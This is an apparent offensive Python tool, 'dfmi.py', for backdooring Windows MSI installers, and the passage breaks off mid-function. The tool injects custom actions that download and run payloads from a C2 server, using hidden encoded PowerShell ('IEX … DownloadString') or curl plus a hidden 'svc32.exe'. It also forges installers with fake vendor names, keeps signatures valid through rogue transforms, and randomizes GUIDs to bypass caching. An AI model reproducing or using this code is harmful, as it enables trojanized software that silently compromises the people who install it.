#!/usr/bin/env python3

import sys
import os
import base64
import uuid
import shutil
import subprocess
import tempfile

BANNER = """
		██████╗ ███████╗███╗   ███╗██╗
		██╔══██╗██╔════╝████╗ ████║██║
		██║  ██║█████╗  ██╔████╔██║██║
		██║  ██║██╔══╝  ██║╚██╔╝██║██║
		██████╔╝██║     ██║ ╚═╝ ██║██║
		╚═════╝ ╚═╝     ╚═╝     ╚═╝╚═╝
                                   
	 Suite for manipulating/creating ".msi" files 
		
	      BiloIndustries - April 2026, v1.0
"""

HELP_MAIN = """
		     
################################################################

Usage:
  python3 dfmi.py <command> [options]

Commands:
  inject      Backdoor an existing MSI package	[Cross-Platform: Windows/Linux]
              Linux Requirements: msibuild/msiinfo
              Windows Requirements: Uses PowerShell COM (no extra tools needed)

  rogue-mst   Generate a .mst transform for a signed MSI  [Please use this module from CMD/PS only.]
              Original MSI Authenticode signature stays valid.

  stub        Create a standalone backdoor MSI from scratch (cross-platform)
              Linux Requirements: wixl/msibuild
              Windows Requirements: Uses embedded base MSI + PowerShell COM
              No original MSI needed. Fully customizable metadata.

Options:
  -h, --help    Show this help

Examples:
  python3 dfmi.py inject example.msi output.msi --c2 http://<C2>/<PAYLOAD>.ps1
  python3 dfmi.py inject example.msi output.msi --c2 http://<C2>/<PAYLOAD>.exe --mode cmd
  python3 dfmi.py inject --inspect example.msi

  python3 dfmi.py rogue-mst build example.msi payload.mst --c2 http://<C2>/<PAYLOAD>.ps1
  python3 dfmi.py rogue-mst verify example.msi payload.mst
  python3 dfmi.py rogue-mst deploy example.msi payload.mst

  python3 dfmi.py stub --c2 http://<C2>/payload.ps1
  python3 dfmi.py stub --c2 http://<C2>/payload.ps1 --name "XXX Updater" --manufacturer "XXX Inc."
  python3 dfmi.py stub --c2 http://<C2>/loader.exe --mode cmd -o update.msi

Run 'python3 dfmi.py <command> --help' for command-specific help.
"""

# Embedded base MSI (minimal stub, no files, cross-platform)

BASE_MSI_B64 = "0M8R4KGxGuEAAAAAAAAAAAAAAAAAAAAAPgADAP7/CQAGAAAAAAAAAAAAAAABAAAADAAAAAAAAAAAEAAACwAAAAEAAAD+////AAAAABEAAAD///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////9BZG1pblVJU2VxdWVuY2VBY3Rpb25Db25kaXRpb25TZXF1ZW5jZUNvc3RJbml0aWFsaXplRmlsZUNvc3RDb3N0RmluYWxpemVFeGVjdXRlQWN0aW9uTWVkaWFEaXNrSWRMYXN0U2VxdWVuY2VEaXNrUHJvbXB0Q2FiaW5ldFZvbHVtZUxhYmVsU291cmNlI2NhYjEuY2FiRXJyb3JNZXNzYWdlU2VydmljZUluc3RhbGxOYW1lRGlzcGxheU5hbWVTZXJ2aWNlVHlwZVN0YXJ0VHlwZUVycm9yQ29udHJvbExvYWRPcmRlckdyb3VwRGVwZW5kZW5jaWVzU3RhcnROYW1lUGFzc3dvcmRBcmd1bWVudHNDb21wb25lbnRfRGVzY3JpcHRpb25BcHBTZWFyY2hQcm9wZXJ0eVNpZ25hdHVyZV9VcGdyYWRlVXBncmFkZUNvZGVWZXJzaW9uTWluVmVyc2lvbk1heExhbmd1YWdlQXR0cmlidXRlc1JlbW92ZUFjdGlvblByb3BlcnR5U2hvcnRjdXREaXJlY3RvcnlfVGFyZ2V0SG90a2V5SWNvbl9JY29uSW5kZXhTaG93Q21kV2tEaXJEaXNwbGF5UmVzb3VyY2VETExEaXNwbGF5UmVzb3VyY2VJZERlc2NyaXB0aW9uUmVzb3VyY2VETExEZXNjcmlwdGlvblJlc291cmNlSWRJbnN0YWxsRXhlY3V0ZVNlcXVlbmNlVmFsaWRhdGVQcm9kdWN0SURJbnN0YWxsVmFsaWRhdGVJbnN0YWxsSW5pdGlhbGl6ZVByb2Nlc3NDb21wb25lbnRzVW5wdWJsaXNoRmVhdHVyZXNSZW1vdmVGb2xkZXJzQ3JlYXRlRm9sZGVyc1JlZ2lzdGVyVXNlclJlZ2lzdGVyUHJvZHVjdFB1Ymxpc2hGZWF0dXJlc1B1Ymxpc2hQcm9kdWN0SW5zdGFsbEZpbmFsaXplUmVnaXN0cnlSb290S2V5VmFsdWVBZHZ0RXhlY3V0ZVNlcXVlbmNlQWN0aW9uVGV4dFRlbXBsYXRlRmVhdHVyZUNvbXBvbmVudHNGZWF0dXJlX1Byb2R1Y3RGZWF0dXJlRW1wdHlDb21wRmlsZUZpbGVOYW1lRmlsZVNpemVWZXJzaW9uRGlyZWN0b3J5RGlyZWN0b3J5X1BhcmVudERlZmF1bHREaXJUZW1wRm9sZGVyVEFSR0VURElSLlNvdXJjZURpckluaUZpbGVEaXJQcm9wZXJ0eVNlY3Rpb25SZW1vdmVGaWxlRmlsZUtleUluc3RhbGxNb2RlUmVtb3ZlSW5pRmlsZUFMTFVTRVJTMU1hbnVmYWN0dXJlckJhc2VQcm9kdWN0TGFuZ3VhZ2UxMDMzUHJvZHVjdENvZGV7MDAwMDAwMDAtMDAwMC0wMDAwLTAwMDAtMDAwMDAwMDAwMDAwfVByb2R1Y3ROYW1lQmFzZU1TSVByb2R1Y3RWZXJzaW9uMS4wLjAuMHswMDAwMDAwMC0wMDAwLTAwMDAtMDAwMC0wMDAwMDAwMDAwMDF9TGF1bmNoQ29uZGl0aW9uU2lnbmF0dXJlTWluVmVyc2lvbk1heFZlcnNpb25NaW5TaXplTWF4U2l6ZU1pbkRhdGVNYXhEYXRlTGFuZ3VhZ2VzSW5zdGFsbFVJU2VxdWVuY2VDb21wb25lbnRDb21wb25lbnRJZEtleVBhdGh7MDAwMDAwMDAtMDAwMC0wMDAwLTAwMDAtMDAwMDAwMDAwMDAyfVNlcnZpY2VDb250cm9sRXZlbnRXYWl0RmVhdHVyZUZlYXR1cmVfUGFyZW50VGl0bGVEaXNwbGF5TGV2ZWxNYWluQmluYXJ5RGF0YUN1c3RvbUFjdGlvblR5cGVFeHRlbmRlZFR5cGVSZWdMb2NhdG9yTXNpRmlsZUhhc2hGaWxlX09wdGlvbnNIYXNoUGFydDFIYXNoUGFydDJIYXNoUGFydDNIYXNoUGFydDRJY29uQWRtaW5FeGVjdXRlU2VxdWVuY2VJbnN0YWxsQWRtaW5QYWNrYWdlSW5zdGFsbEZpbGVzQ3JlYXRlRm9sZGVyAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA8AAwAGAAkACQAHAAgABgAOAAEACAABAAwAAQANAAEABQAGAAYAAQAMAAEACgABAAcAAQALAAEABgACAAkAAQAFAAMABwABAA4ADgAEAAcACwABAAsAAQAJAAEADAABAA4AAQAMAAEACQABAAgAAQAJAAMACgAKAAsABQAJAAIACAAEAAoAAgAHAAcACwABAAoAAQAKAAEACAACAAoABAAGAAEADgABAAgAEQAKAAQABgACAAYAAQAFAAEACQABAAcAAQAFAAEAEgABABEAAQAWAAEAFQABABYAAwARAAEADwABABEAAQARAAEAEQABAA0AAQANAAEADAABAA8AAQAPAAEADgABAA8AAQAIAAcABAACAAMABAAFAAQAEwADAAoAAwAIAAEAEQACAAgAAQAOAAEACQABAAAAAAAAAAAABAAJAAgABQAIAAEABwABAAkABAAQAAEACgABAAoAAQAJAAEAAQABAAkAAQAHAAkACwADAAcAAgAKAAUABwABAAsAAQANAAkACAABAAEAAQAMAAEABAABAA8AAQAEAAEACwABACYAAQALAAEABwABAA4AAQAHAAEAJgABAA8AAgAJAAoACgABAAoAAQAHAAEABwABAAcAAQAHAAEACQABABEAAwAJAAcACwABAAcAAQAmAAEADgAHAAUAAQAEAAEABwAJAA4AAQAFAAEABwABAAUAAQAEAAEABgACAAQAAgAMAAUABAACAAwAAQAKAAUACwAGAAUAAQAHAAEACQABAAkAAQAJAAEACQABAAQAAgAUAAMAEwABAAwAAQAMAAIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAD+/wAABQACAAAAAAAAAAAAAAAAAAAAAAABAAAA4IWf8vlPaBCrkQgAKyez2TAAAAC8AQAADgAAAAEAAAB4AAAAAgAAAIAAAAADAAAAoAAAAAQAAACwAAAABQAAAMAAAAAGAAAA1AAAAAcAAAAwAQAACQAAAEQBAAAMAAAAdAEAAA0AAACAAQAADgAAAIwBAAAPAAAAlAEAABIAAACcAQAAEwAAALQBAAACAAAA5AQAAB4AAAAWAAAASW5zdGFsbGF0aW9uIERhdGFiYXNlAAAAHgAAAAgAAABCYXNlTVNJAB4AAAAFAAAAQmFzZQAAAAAeAAAACgAAAEluc3RhbGxlcgAAAB4AAABRAAAAVGhpcyBpbnN0YWxsZXIgZGF0YWJhc2UgY29udGFpbnMgdGhlIGxvZ2ljIGFuZCBkYXRhIHJlcXVpcmVkIHRvIGluc3RhbGwgQmFzZU1TSS4AAAAAHgAAAAsAAABJbnRlbDsxMDMzAAAeAAAAJwAAAHtCRkI1QTAxNy0wNjY5LTQ2MjQtQjZDMC0xRDJEMDE5NDRCQzJ9AABAAAAAgPmygRnI3AFAAAAAgPmygRnI3AEDAAAAyAAAAAMAAAACAAAAHgAAAA8AAABtc2l0b29scyAwLjEwMwAAAwAAAAIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAE1TQ0YAAAAALAAAAAAAAAAsAAAAAAAAAAMBAQAAAAAAAAAAACwAAAAAAAEAAAAAAAAAAAAAAAAAAAAAAAAAAABYAE4AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABQAGAAcAOQA6AEMAlgCXAAAAAAAAAAAAAAAAAAAAAAAgg4SD6IN4hdyFyJk8j6CPAAAAAAAAAAAAAAAAAAAAAE0AAACGAAAAAoABgAAAAIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABOAH0AWAAAgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABQAGAAcACAA4AAAAAAAAAAAAAAAgg4SD6IMUhbyCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACQAYwBlAGcAaQBrAG0AbwBkAGYAaABqAGwAbgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABYAFkAWQAAAFoAWwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAATQBOAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAUABwA5ADoAQQBCAEMAAAAAAAAAAAAAAAAAAAAgg+iDeIXchZyYAJnImQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAFAAYABwA4ADkAOgA7ADwAPQA+AD8AQABBAEIAQwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAgg4SD6IO8gniF3IVAhgiHEI50jnCX1JecmACZyJkAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAGAAAAAgAAAEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAFAAYABwAIAAAAAAAAAAAAIIOEg+iDFIUAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAQABAAEACQAJAAkACQAJAAkAEQARABMAEwATABMAEwATABMAEwATABMAEwATABMAIAAgACEAIQAjACMAIwAjACMAIwAjACsAKwArACsAKwArACsAKwArACsAKwArACsAKwArACsANwA3ADcARABEAEQARABEAEQASABIAEgASQBJAEkASwBLAFEAUQBRAFEAUQBRAFEAUQBVAFUAVQBcAFwAXABcAFwAXABcAFwAXwBfAF8AXwBfAGIAYgBiAGIAYgBiAGIAYgBwAHAAcQBxAHEAcQBxAHEAcQBxAHEAeQB5AHkAegB6AHoAegB6AHoAfgB+AH4AfgB+AH4AgQCBAIEAgQCBAIEAgQCBAIcAhwCJAIkAiQCJAIkAjACMAIwAjACMAI0AjQCNAI0AjQCNAJQAlACVAJUAlQCYAJgAAYACgAOAAYACgAOABIAFgAaAAYACgAGAAoADgASABYAGgAeACIAJgAqAC4AMgA2AAYACgAGAAoABgAKAA4AEgAWABoAHgAGAAoADgASABYAGgAeACIAJgAqAC4AMgA2ADoAPgBCAAYACgAOAAYACgAOABIAFgAaAAYACgAOAAYACgAOAAYACgAGAAoADgASABYAGgAeACIABgAKAA4ABgAKAA4AEgAWABoAHgAiAAYACgAOABIAFgAGAAoADgASABYAGgAeACIABgAKAAYACgAOABIAFgAaAB4AIgAmAAYACgAOAAYACgAOABIAFgAaAAYACgAOABIAFgAaAAYACgAOABIAFgAaAB4AIgAGAAoABgAKAA4AEgAWAAYACgAOABIAFgAGAAoADgASABYAGgAGAAoABgAKAA4ABgAKAAgADAAQACgALAAwADQAOAA8AEQASABMAFAAVABYAFwAYABkAGgAbABwAHQAeAB8AIQAiACEARwAkACUAJgAnACgAKQAqACsALAAUAB4ALQAdAB8ALgAvADAAMQAyADMANAA1ADYAAgADAAQARABFAEYAFABHAB4AAgADAAQAAgAfAEoATAAeAFEAHgBSAFMAVAAnACgABABVAFYAVwBcAFIAXQBeAEYARwACAB4AYAAeAFIAXQBhAGIAUgBdAF4ARgBHAAIAHgADAB8AcQBSAHIAcwB0AHUAdgB3AHgAAgADAAQAegB7ACwAKAADAHwAfgAUAH8AHQCAAB4AgQCCAIMAHwCEAIUALAAoABQAiAACAIoADwAtAIsAIgBFAEYAFACKAI4AjwCQAJEAkgCTABQAiAACAAMABAAsAB4ASK3/nQKVAqUEgUCf/50gnUidAqUAn0it/43/nwSBBIEEgf+d/53/nf+d/51Ijf+fSK1IrUitAI8mrRS9FL3/vQSh/51IjUitSI2Aj0iNSI3/nf+fApVInQKVApVInf+dApX/nQKVSK3/nQKVSK0Chf+P/58An0iNSK3/nQKVSK3/n/+fJq1IrUitSI3/jwSBSJ0UnQKVBIFIrUid/49Irf+PSJ3/j/+P/48ChUiNSK1Ijf+fSI0ChUit/49Inf+P/4//nwKFSI3/rf+PSK3/jRSdFJ0EkQSRBJEEkf+dSK3/nQKVSK0mnUiNAoX/nUidSK3/jwKF/58ClUiNJq0mnUCf/58ClQKFSJ0ChUitAIlIrQKFSJ3/nQSRSK0Chf+N/50ClUitAoUEgQSBBIEEgUitAIlIrf+dApVIrUitAAAAAAAAAAABAAkAEQATACAAIQAjACsANwBEAEgASQBLAFEAVQBcAF8AYgBwAHEAeQB6AH4AgQCHAIkAjACNAJQAlQCYAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAQAAAAIAAAADAAAABAAAAAUAAAAGAAAABwAAAAgAAAAJAAAACgAAAAsAAAAMAAAADQAAAA4AAAAPAAAAEAAAABEAAAASAAAAEwAAABQAAAAVAAAAFgAAABcAAAAYAAAA/v///xoAAAAbAAAAHAAAAB0AAAAeAAAAHwAAACAAAAAhAAAAIgAAACMAAAAkAAAAJQAAACYAAAD+////KAAAACkAAAAqAAAAKwAAACwAAAAtAAAALgAAAP7////+/////v////7////+/////v////7////+/////v////7////+////OgAAAP7////+/////v///z4AAAA/AAAAQAAAAEEAAABCAAAAQwAAAEQAAABFAAAARgAAAEcAAABIAAAASQAAAEoAAABLAAAATAAAAE0AAABOAAAATwAAAFAAAAD+/////v////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////9SAG8AbwB0ACAARQBuAHQAcgB5AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAFgAFAf//////////BAAAAIQQDAAAAAAAwAAAAAAAAEYAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACAFAAAAAAAAEBIPz93RWxEajvkRSRIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAQAAIB/////wIAAAD/////AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACIGAAAAAAAAQEg/P3dFbERqPrJEL0gAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABAAAgH/////BQAAAP////8AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAZAAAARAMAAAAAAAAFAFMAdQBtAG0AYQByAHkASQBuAGYAbwByAG0AYQB0AGkAbwBuAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAKAACAf///////////////wAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACcAAADsAQAAAAAAACZBZTi+QWRBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA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AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAADAACAf////8HAAAA/////wAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAFEAAAA+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAQAAAAIAAAADAAAABAAAAAUAAAAGAAAABwAAAAgAAAAJAAAACgAAAP7////+////DQAAAA4AAAAPAAAAEAAAAP7////9//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////8="


# Utils

def is_windows():
    return sys.platform == 'win32'

def gen_guid():
    return "{" + str(uuid.uuid4()).upper() + "}"

def build_ca_ps(url):
    if url.endswith('.ps1'):
        ps = f"IEX (New-Object Net.WebClient).DownloadString('{url}')"
    else:
        ps = (f"$p=$env:TEMP+'\\svc32.exe';"
              f"(New-Object Net.WebClient).DownloadFile('{url}',$p);"
              f"Start-Process $p -WindowStyle Hidden")
    b64 = base64.b64encode(ps.encode('utf-16-le')).decode()
    return f'/c "powershell -NoP -W Hidden -NonI -Exec Bypass -Enc {b64} & exit 0"'

def build_ca_cmd(url):
    return f'/c "curl -s {url} -o %TEMP%\\svc32.exe && start /b %TEMP%\\svc32.exe & exit 0"'

def run_ps(script):
    tmp = tempfile.NamedTemporaryFile(suffix=".ps1", mode='w',
                                      encoding='utf-8', delete=False)
    tmp.write(script)
    tmp.close()
    try:
        r = subprocess.run(
            ['powershell.exe', '-NoProfile', '-ExecutionPolicy', 'Bypass', '-File', tmp.name],
            capture_output=True, text=True, timeout=120
        )
        return r.returncode == 0, r.stdout.strip(), r.stderr.strip()
    finally:
        try:
            os.unlink(tmp.name)
        except Exception:
            pass

# Inject Module

HELP_INJECT = """
Command: inject
===============
Backdoor an existing MSI by injecting a CustomAction.
Works on Kali (msibuild) and Windows (PowerShell COM).
Original MSI is never modified — a copy is produced.

Usage:
  python3 dfmi.py inject <target.msi> <output.msi> --c2 <url> [--mode ps|cmd]
  python3 dfmi.py inject --inspect <target.msi>

Arguments:
  target.msi      Source MSI (untouched)
  output.msi      Backdoored output MSI
  --c2 <url>      Payload URL on C2 server
  --mode ps       PowerShell IEX fileless (default)
  --mode cmd      curl download + execute EXE
  --inspect       Dump MSI tables instead of backdooring

Notes:
  - ProductCode and PackageCode randomized on every run (cache bypass)
  - Missing tables auto-created (handles MSIs like 7-Zip)
  - CA returns exit 0 — install never aborts
  - Authenticode signature invalidated on signed MSIs (use rogue-mst to preserve)

Deploy:
  msiexec /i output.msi /qn
  msiexec /i output.msi /qn && msiexec /x {ProductCode} /qn
"""

# Linux back-end

def _sql_linux(msi, query):
    r = subprocess.run(['msibuild', msi, '-q', query], capture_output=True, text=True)
    return r.returncode == 0, r.stderr.strip()

def _export_linux(msi, table):
    r = subprocess.run(['msiinfo', 'export', msi, table], capture_output=True, text=True)
    return r.stdout if r.returncode == 0 else r.stderr

def _ensure_table_linux(msi, table, header, col_types):
    out = _export_linux(msi, table)
    if "table not found" in out or not out.strip():
        print(f"[*] Creating {table} table...")
        idt = tempfile.NamedTemporaryFile(suffix=".idt", mode="w", delete=False)
        idt.write(header + "\r\n")
        idt.write(col_types + "\r\n")
        idt.write(table + "\tAction\r\n")
        idt.close()
        r = subprocess.run(["msibuild", msi, "-i", idt.name], capture_output=True, text=True)
        print(f"    {'OK' if r.returncode == 0 else 'FAIL: '+r.stderr.strip()}")
        os.unlink(idt.name)

def _randomize_guids_linux(msi):
    new_prod = gen_guid()
    new_pkg  = gen_guid()
    _sql_linux(msi, f"UPDATE Property SET Value='{new_prod}' WHERE Property='ProductCode'")
    _sql_linux(msi, f"UPDATE Property SET Value='{new_prod}' WHERE Property='UpgradeCode'")
    r = subprocess.run(['msiinfo', 'suminfo', msi], capture_output=True, text=True)
    info = {}
    for line in r.stdout.strip().split('\n'):
        if ': ' in line:
            k, v = line.split(': ', 1)
            info[k.strip()] = v.strip()
    title  = info.get('Title', 'Installation Database')
    author = info.get('Author', '')
    subprocess.run(['msibuild', msi, '-s', title, author, '', new_pkg], capture_output=True)
    print(f"[*] New ProductCode : {new_prod}")
    print(f"[*] New PackageCode : {new_pkg}")
    return new_prod

def _inject_linux(target, output, exe_args, exe_path='C:\\Windows\\System32\\cmd.exe', exe_prop='CMDEXE'):
    shutil.copy(target, output)
    prod_code = _randomize_guids_linux(output)
    print()
    _ensure_table_linux(output, "CustomAction",
                        "Action\tType\tSource\tTarget\tExtendedType",
                        "s72\ti2\tS72\tS255\tI4")
    _ensure_table_linux(output, "InstallExecuteSequence",
                        "Action\tCondition\tSequence",
                        "s72\tS255\tI2")
    print("[*] Injecting property...")
    ok, err = _sql_linux(output, f"INSERT INTO Property (Property, Value) VALUES ('{exe_prop}', '{exe_path}')")
    if not ok:
        ok, err = _sql_linux(output, f"UPDATE Property SET Value='{exe_path}' WHERE Property='{exe_prop}'")
    print(f"    {'OK' if ok else 'FAIL: '+err}")
    print("[*] Injecting CustomAction...")
    ok, err = _sql_linux(output,
        f"INSERT INTO CustomAction (Action, Type, Source, Target) "
        f"VALUES ('WU', 50, '{exe_prop}', '{exe_args}')")
    if not ok:
        print(f"    FAIL: {err}"); return False
    print(f"    OK")
    print("[*] Injecting sequence (1510)...")
    ok, err = _sql_linux(output,
        "INSERT INTO InstallExecuteSequence (Action, Condition, Sequence) "
        "VALUES ('WU', '', 1510)")
    if not ok:
        print(f"    FAIL: {err}"); return False
    print(f"    OK")
    print("\n[*] Verifying...")
    ca_out = _export_linux(output, "CustomAction")
    if "WU" in ca_out:
        print("[+] CustomAction OK")
        for line in ca_out.split('\r\n'):
            if 'WU' in line: print(f"    {line[:120]}")
    else:
        print("[-] CustomAction MISSING"); return False
    if "WU" in _export_linux(output, "InstallExecuteSequence"):
        print("[+] Sequence OK")
    else:
        print("[-] Sequence MISSING"); return False
    return prod_code

def _inspect_linux(msi):
    print(f"\n{'='*60}\n  MSI: {msi}\n{'='*60}")
